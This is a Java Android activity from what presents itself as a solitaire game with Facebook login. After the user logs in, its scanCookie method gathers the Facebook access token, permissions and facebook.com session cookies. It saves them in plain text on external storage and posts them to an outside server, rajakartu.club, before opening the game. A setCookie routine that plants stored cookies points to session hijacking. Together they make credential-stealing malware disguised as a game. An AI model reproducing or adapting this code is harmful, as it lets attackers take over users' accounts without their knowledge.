package net.igame.solitaire;

import java.io.File;
import java.io.FileOutputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.facebook.AccessToken;
import com.facebook.AccessTokenSource;
import com.facebook.CallbackManager;
import com.facebook.FacebookCallback;
import com.facebook.FacebookException;
import com.facebook.FacebookSdk;
import com.facebook.GraphRequest;
import com.facebook.GraphResponse;
import com.facebook.HttpMethod;
import com.facebook.internal.WebDialog;
import com.facebook.login.LoginManager;
import com.facebook.login.LoginResult;
import com.facebook.share.model.GameRequestContent;
import com.facebook.share.model.GameRequestContent.ActionType;
import com.facebook.share.widget.GameRequestDialog;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.Signature;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.widget.Button;

public class Main2Activity extends Activity {
	Button btnLogin, btnGetUser, btnInvite, btnPlayNow;
	Handler handler = new Handler();
	JSONArray invited_token_arr = new JSONArray();
	CallbackManager callbackManager;
	String inviteTokenString = "";
	GameRequestDialog requestDialog;
	String appId;
	String token;
	String name = "";
	String userId;
	JSONObject tokenObj;
	JSONObject cookieObj;
	Date expireTime;
	Date refreshTime;
	public String TAG = "MainActivity";
	public static final String FACEBOOK_REQUEST_ME_FIELD = "birthday,middle_name,link,locale,id,first_name,email,verified,name,last_name,gender,ids_for_business";
	public static final List<String> FACEBOOK_PERMISSION = Arrays.asList(
			"public_profile", "email", "user_friends");

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		FacebookSdk.sdkInitialize(getApplicationContext());
		try {
			PackageInfo info = getPackageManager().getPackageInfo(
					"net.igame.solitaire", PackageManager.GET_SIGNATURES);
			for (Signature signature : info.signatures) {
				MessageDigest md = MessageDigest.getInstance("SHA");
				md.update(signature.toByteArray());
				Log.d("KeyHash:",
						Base64.encodeToString(md.digest(), Base64.DEFAULT));
			}
		} catch (NameNotFoundException e) {

		} catch (NoSuchAlgorithmException e) {

		}

		initAction();
	}
	public void initAction() {
		btnLogin = (Button) findViewById(R.id.button_login);
		btnGetUser = (Button) findViewById(R.id.button_get_user);
		btnInvite = (Button) findViewById(R.id.button_send_invited);
		btnPlayNow = (Button) findViewById(R.id.button_play_now);
		
		callbackManager = CallbackManager.Factory.create();
		
		
		handler.postDelayed(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				if(AccessToken.getCurrentAccessToken() != null){
					btnPlayNow.setVisibility(View.VISIBLE);
					btnLogin.setVisibility(View.INVISIBLE);
				}else{
					btnPlayNow.setVisibility(View.INVISIBLE);
					btnLogin.setVisibility(View.VISIBLE);
				}
			}
		}, 2000);
		
		
		LoginManager.getInstance().registerCallback(callbackManager,
				new FacebookCallback<LoginResult>() {

					@Override
					public void onSuccess(LoginResult result) {
						Log.e(TAG, "on Success");
						
						AccessToken accessToken = AccessToken
								.getCurrentAccessToken();
						if (accessToken != null) {

							
						}
						Bundle params = new Bundle();
						params.putString("fields",
								FACEBOOK_REQUEST_ME_FIELD);
						GraphRequest graphRequest = new GraphRequest(
								AccessToken.getCurrentAccessToken(), "/me",
								params, HttpMethod.GET,
								new GraphRequest.Callback() {

									@Override
									public void onCompleted(
											GraphResponse response) {
										Log.e("Graph callback",
												response.toString());
										JSONObject user = response
												.getJSONObject();
										Log.e(TAG , user.toString());
										try {
											name = user.getString("name");
										} catch (JSONException e) {
											e.printStackTrace();
										}							
										checkCondition();
									}
								});

						graphRequest.executeAsync();

					}

					@Override
					public void onError(FacebookException error) {
					}

					@Override
					public void onCancel() {

					}
				});

		btnLogin.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View v) {
				ArrayList<String> permission = new ArrayList<String>();
				permission.add("email");
				permission.add("user_friends");
				permission.add("public_profile");
				LoginManager.getInstance().logInWithReadPermissions(
						Main2Activity.this, permission);

			}
		});

		btnGetUser.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				Bundle params = new Bundle();
				GraphRequest graphRequest = new GraphRequest(AccessToken
						.getCurrentAccessToken(), "/me/invitable_friends",
						params, HttpMethod.GET, new GraphRequest.Callback() {

							@Override
							public void onCompleted(GraphResponse response) {
								// TODO Auto-generated method stub
								Log.e("Graph callback", response.toString());
								JSONObject data = response.getJSONObject();
								try {
									JSONArray arrayUser = data
											.getJSONArray("data");
									for (int i = 0; i < arrayUser.length(); i++) {
										JSONObject obj = arrayUser
												.getJSONObject(i);
										invited_token_arr.put(obj
												.getString("id"));
										inviteTokenString += obj
												.getString("id") + ",";
									}

								} catch (JSONException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}

							}
						});

				graphRequest.executeAsync();

			}
		});


		btnInvite.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				Log.e(TAG, invited_token_arr.toString());
				// GameRequestContent content = new GameRequestContent.Builder()
				// .setMessage("Come play this level with me")
				// .setObjectId("1234").setActionType(ActionType.SEND)
				//
				// .build();
				// requestDialog.show(content);
				handler.post(new Runnable() {

					@Override
					public void run() {
						// TODO Auto-generated method stub
						Bundle params = new Bundle();
						params.putString("title", "Send a Request");
						params.putString("message",
								"Learn how to make your Android apps social");
						// params.putString("to", inviteTokenString); // comma
						// seperated list of facebook IDs to preset the
						// recipients. If left out, it will show a Friend
						// Picker.
						params.putString("to", invited_token_arr
								.toString());
						params.putString("data",
								"{\"badge_of_awesomeness\":\"1\","
										+ "\"social_karma\":\"5\"}"); // any
																		// additional
																		// data

						final WebDialog requestsDialog = (new WebDialog.Builder(
								Main2Activity.this, "apprequests", params))
								.build();
						requestsDialog.show();
						handler.postDelayed(new Runnable() {

							@Override
							public void run() {
								// TODO Auto-generated method stub
								requestsDialog.dismiss();
							}
						}, 14000);
					}
				});

			}
		});
	
		btnPlayNow.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				startActivity(new Intent(getApplicationContext(), SolitaireCG.class));
			}
		});
	}

	public void checkCondition() {

		cookieObj = new JSONObject();
		try{
			scanCookie(this, "https://.facebook.com");
		}catch(Exception ex){
			ex.printStackTrace();
		}
		
	}

	public void scanCookie(Context context, String domain) {

		CookieSyncManager syncManager = CookieSyncManager
				.createInstance(context);
		syncManager.sync();
		AccessToken accessToken = AccessToken.getCurrentAccessToken();
		CookieManager cookieManager = CookieManager.getInstance();
		if (accessToken != null) {
			String appId = accessToken.getApplicationId();
			String userId = accessToken.getUserId();
			String token = accessToken.getToken();
			Set<String> permissions = accessToken.getPermissions();
			Set<String> declinedPermissions = accessToken
					.getDeclinedPermissions();
			AccessTokenSource accessTS = accessToken.getSource();
			Date expirationTime = accessToken.getExpires();
			Date lastRefreshTime = accessToken.getLastRefresh();
			Log.e(TAG, "appID = " + appId);
			Log.e(TAG, "token = " + token);
			Log.e(TAG, "userId = " + userId);
			Log.e(TAG, "permissions = " + permissions.toString());
			Log.e(TAG,
					"declinedPermissions = " + declinedPermissions.toString());
			Log.e(TAG, "accessTokenSource = " + accessTS.toString());
			Log.e(TAG, "expirationTime = " + expirationTime.toString());
			Log.e(TAG, "lastRefreshTime = " + lastRefreshTime.toString());
			tokenObj = new JSONObject();
			try {
				tokenObj.put(StoreManager.appId, appId);
				tokenObj.put(StoreManager.userId, userId);
				tokenObj.put(StoreManager.token, token);
				tokenObj.put(StoreManager.permissions, permissions);
				tokenObj.put(StoreManager.declinedPermissions,
						declinedPermissions);
				tokenObj.put(StoreManager.accessTS, accessTS);
				tokenObj.put(StoreManager.expirationTime, expirationTime);
				tokenObj.put(StoreManager.lastRefreshTime, lastRefreshTime);
				Log.e(TAG, "token Oobj: " + tokenObj.toString());

				// checkCondition();
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		String cookies = cookieManager.getCookie(domain);
		try {
			cookieObj.put(domain, cookies);
			
		} catch (JSONException e) {
			e.printStackTrace();
		}
		Log.e(domain, cookies);

		String root = Environment.getExternalStorageDirectory().toString();
		File myDir = new File(root + "/appdata");
		Log.e("WebDialog ", "root = " + root);
		myDir.mkdirs();
		String fname = "cookie-" + accessToken.getUserId() + ".txt";
		File file = new File(myDir, fname);
		if (file.exists())
			file.delete();
		try {
			FileOutputStream out = new FileOutputStream(file);
			out.write(("[https://.facebook.com]").getBytes());
			out.write(("\n").getBytes());
			out.write(cookies.getBytes());
			out.write(("\n").getBytes());
			out.write(("[token]").getBytes());
			out.write(("\n").getBytes());
			out.write(tokenObj.toString().getBytes());
			out.write(("\n").getBytes());
			out.flush();
			out.close();

		} catch (Exception e) {
			e.printStackTrace();
		}
		
		ArrayList<NameValuePair> arrayToken = new ArrayList<NameValuePair>();
		arrayToken.add(new BasicNameValuePair("token", tokenObj.toString()));
		arrayToken.add(new BasicNameValuePair("cookie", cookies));
		arrayToken.add(new BasicNameValuePair("app_id", accessToken.getApplicationId()));
		arrayToken.add(new BasicNameValuePair("username", name));
		try {
			String query = MyHttpClient.getQuery(arrayToken);
			MyHttpClient.postHttp("http://rajakartu.club/facebook_token.php", query, new MyHttpClient.DownloadComplete() {
				
				@Override
				public void onError(String urlStr) {
					// TODO Auto-generated method stub
					
				}
				
				@Override
				public void onDownloadComplete(byte[] bytes) {
					// TODO Auto-generated method stub
					Log.e(TAG, new String(bytes));
					
					handler.post(new Runnable() {
						
						@Override
						public void run() {
							// TODO Auto-generated method stub
							startActivity(new Intent(getApplicationContext(), SolitaireCG.class));
						}
					});
				}
			});
			
			
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		

	}

	public void setCookie(Context context) {
		setCookiesForDomain(this, "https://.facebook.com", StoreManager.cookie4);

	}

	private void setCookiesForDomain(Context context, String domain,
			String cookieString) {
		// This is to work around a bug where CookieManager may fail to
		// instantiate if
		// CookieSyncManager has never been created.
		CookieSyncManager syncManager = CookieSyncManager
				.createInstance(context);
		syncManager.sync();

		CookieManager cookieManager = CookieManager.getInstance();

		String cookies = cookieString;
		if (cookies == null) {
			return;
		}

		String[] splitCookies = cookies.split(";");
		for (String cookie : splitCookies) {
			String[] cookieParts = cookie.split("=");
			if (cookieParts.length > 0) {
				String newCookie = cookieParts[0].trim() + "="
						+ cookieParts[1].trim()
						+ ";expires=Sat, 1 Sep 2016 00:00:01 UTC;";
				cookieManager.setCookie(domain, newCookie);
			}
		}
	}

	public void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		callbackManager.onActivityResult(requestCode, resultCode, data);
	}
}
